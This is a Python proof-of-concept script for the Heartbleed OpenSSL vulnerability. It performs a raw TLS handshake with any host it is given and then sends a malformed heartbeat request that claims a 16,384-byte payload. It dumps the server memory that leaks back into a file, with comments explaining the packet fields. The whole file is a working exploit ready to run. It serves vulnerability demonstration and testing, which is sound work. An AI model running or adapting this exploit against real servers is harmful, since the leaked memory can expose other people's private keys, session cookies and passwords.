#!/usr/bin/python
 
# Hearthbleed PoC by Martial Puygrenier (mpgn) inspired from Jared Stafford 
# https://gist.github.com/sh1n0b1/10100394

import argparse
import time
import re
import select
import socket
import struct
import ssl
import sys
from utils.pyfancy import *
 
def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

'''
In tls handshake, "hello" is the first message send by the client to the server
In this case, hello reproduce the "hello" handshake with lot of informations like the TLS version, the cipher suits ...
We could without this, but it's allow us to avoid the ssl configuration at the connection of the client like ssl.wrap_socket and the certificate.
'''    
 
hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')
 
hb = h2bin('''
18 03 02 00 03
01 40 00
''')

'''
Explanation of heartbeat (bf)call :
    18      : hearbeat record
    03 02   : TLS version
    00 03   : length
    01      : hearbeat request
    40 00   : payload length 16 384 bytes check rfc6520 
                "The total length of a HeartbeatMessage MUST NOT exceed 2^14"
                If we enter FF FF -> 65 535, we will received 4 paquets of length 16 384 bytes
'''
 
# write the result into a file
def hexdump(s):
    orig_stdout = sys.stdout
    f = file('out.txt', 'w')
    sys.stdout = f
    for b in range(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        print('  %04x: %-48s %s' % (b, hxdat, pdat))
    print()
    sys.stdout = orig_stdout
    f.close()

# python doesn't provide recvall 
# http://stackoverflow.com/a/17664559/2274530
def recvall(sock, count):
    buf = b''
    while count:
        newbuf = sock.recv(count)
        if not newbuf: return None
        buf += newbuf
        count -= len(newbuf)
    return buf
     
def hit_hb(s):
    # send heartbeat request to the server
    s.send(hb)

    #start listening the answer from the server
    while True:

        # we first get the 5 bytes of the request : content_type, version, length
        # http://wiki.wireshark.org/SSL
        hdr = s.recv(5)
        if hdr is None:
            print('Unexpected EOF receiving record header - server closed connection')
            return False
        (content_type, version, length) = struct.unpack('>BHH', hdr)

        if content_type is None:
            print('No heartbeat response received, server likely not vulnerable')
            return False

        # we can't use s.recv(length) because the server can separate the packet heartbeat into different smaller packet
        pay = recvall(s,length)
        if pay is None:
            print('Unexpected EOF receiving record payload - server closed connection')
            return False

        sys.stdout.write(' ... received message: type = %d, ver = %04x, length = ' % (content_type, version))
        if content_type == 24 and len(pay) > 3:
            sys.stdout.write(pyfancy.RED + str(len(pay)) + pyfancy.END)
        else:
            sys.stdout.write(str(len(pay)))
        print('')

        # heartbeat content type is 24 check rfc6520
        if content_type == 24:
            print('Received heartbeat response in file out.txt')
            hexdump(pay)
            if len(pay) > 3:
                print(pyfancy.RED + 'WARNING ' + pyfancy.END + ': server returned more data than it should - server is vulnerable!')
            else:
                print('Server processed malformed heartbeat, but did not return any extra data.')
            return True
    
        # error
        if content_type == 21:
            print('Received alert:')
            hexdump(pay)
            print('Server returned error, likely not vulnerable')
            return False
 
if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Heartbleed PoC')
    parser.add_argument('host', help='hostname or IP address')
    parser.add_argument('port', type=int, help='TCP port number', nargs='*', default=443)
    args = parser.parse_args()
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('Connecting...')
    s.connect((args.host, args.port))

    print('Sending Client Hello...')
    s.send(hello)
    # pass the handshake
    while True:
        hdr = s.recv(5)
        (content_type, version, length) = struct.unpack('>BHH', hdr)
        hand = recvall(s,length)
        print((' ... received message: type = %d, ver = %04x, length = %d' % (content_type, version, len(hand))))
        # Look for server hello done message.
        if content_type == 22 and ord(hand[0]) == 0x0E:
            break

    print('Handshake done...')
    print('Sending heartbeat request with length ' + pyfancy.RED + '4' + pyfancy.END + ' :')
    hit_hb(s)